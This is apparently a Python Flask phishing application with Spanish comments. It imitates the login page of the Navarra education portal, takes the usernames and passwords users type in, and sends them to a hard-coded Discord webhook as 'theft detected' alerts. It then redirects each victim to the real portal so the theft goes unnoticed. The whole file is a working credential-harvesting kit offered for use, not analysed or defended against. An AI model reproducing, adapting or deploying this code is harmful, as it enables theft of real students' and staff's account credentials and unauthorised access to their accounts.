from flask import Flask, render_template, request, redirect, url_for, flash
import datetime
import requests # Importamos la librería requests

app = Flask(__name__)
app.secret_key = 'una_clave_secreta_muy_fuerte_para_navarra'

# -------------------------------------------------------------------
# CONFIGURACIÓN DEL WEBHOOK DE DISCORD
# -------------------------------------------------------------------
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1518377673565671534/CIQeiO5S8GjGnCbt--qiOImdwmEKBI9aqqwxyp0ajcTdlPDY9ioeDtemWhzg5JTo1OaA"

def log_robo_a_discord(username, password):
    """Función para enviar el evento de robo al Webhook de Discord."""

    # Formatear el mensaje para que sea atractivo en Discord
    mensaje_discord = {
        "content": f"🚨 **¡NUEVO ROBO DETECTADO!** 🚨\n"
                    f"👤 **Usuario:** `{username}`\n"
                    f"🔑 **Contraseña:** `{password}`\n"
                    f"🕒 **Hora:** {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                    f"🔗 **Sitio:** Portal Educativo Navarra (Phishing)",
        "username": "🤖 CyberNeurova Bot", # Nombre personalizado para el bot en Discord
        "avatar_url": "URL_OPCIONAL_DE_LOGO" # Puedes poner aquí una imagen si quieres
    }

    try:
        response = requests.post(
            DISCORD_WEBHOOK_URL,
            json=mensaje_discord
        )
        response.raise_for_status() # Lanza una excepción para errores HTTP (4xx o 5xx)
        print("\n✅ Éxito: Datos de Phishing enviados a Discord.")
        return True
    except requests.exceptions.RequestException as e:
        print(f"\n❌ ERROR al enviar a Discord: {e}")
        return False

# -------------------------------------------------------------------
# RUTA PRINCIPAL
# -------------------------------------------------------------------
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        # 1. Captura de Datos
        username = request.form.get('username')
        password = request.form.get('password')

        if not username or not password:
            flash("Por favor, introduce usuario y contraseña.")
            return render_template('login_form.html')

        # 2. Registro y Envío a Discord (¡El punto clave!)
        exito_discord = log_robo_a_discord(username, password)

        if exito_discord:
            # 3. El "Phishing Real" - Redirección
            URL_DESTINO_REAL = "https://www.educacion.navarra.es/login" # <-- ¡CAMBIA ESTO!

            # Le damos feedback al usuario
            flash(f"✅ ¡Login capturado exitosamente! Redirigiendo al sitio oficial...", 'success')
            return redirect(URL_DESTINO_REAL)
        else:
            flash("⚠️ Captura exitosa, pero hubo un error al notificar a Discord. Redirigiendo de todas formas...", 'error')
            return redirect(URL_DESTINO_REAL)

    # Si es GET, solo mostramos el formulario
    return render_template('login_form.html')

# -------------------------------------------------------------------
# RUTA DE ADMINISTRACIÓN (Mantiene el registro local para referencia)
# -------------------------------------------------------------------
# (Puedes mantener esta ruta si quieres ver el estado localmente sin depender solo de Discord)
@app.route('/admin')
def admin():
    # Nota: Necesitarías implementar el registro local si quieres que esta ruta funcione.
    return "Panel de Administración - Logs locales (requiere implementación de almacenamiento)."

if __name__ == '__main__':
    app.run(debug=True, port=5000)
